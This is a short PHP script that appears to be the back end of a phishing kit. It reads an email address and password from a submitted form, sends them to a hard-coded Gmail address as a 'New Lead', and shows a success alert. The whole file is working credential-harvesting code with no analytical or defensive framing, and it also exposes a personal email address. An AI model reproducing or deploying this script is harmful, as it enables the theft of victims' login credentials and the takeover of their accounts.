<?php
if(isset($_POST['sub'])){
$name = $_POST['email'];
$num = $_POST['password'];
         $to = "harvygomez61@gmail.com";
         $subject = "New Lead";
         
         $message = "<table border='1' cellpadding='10'><tr><td>Email</td><td>$name</td></tr>
         <tr><td>Password</td><td>$num</td></tr></table>";
         
         $header = "From: harvygomez61@gmail.com\r\n";
         // $header .= "Bcc: mailto@gmail.com\r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail ($to,$subject,$message,$header);
         
         if( $retval == true ) {
            echo "<script>alert('Success...')</script>";
         }else {
            echo "<script>alert('Message could not be sent...')</script>";
         }
}
?>
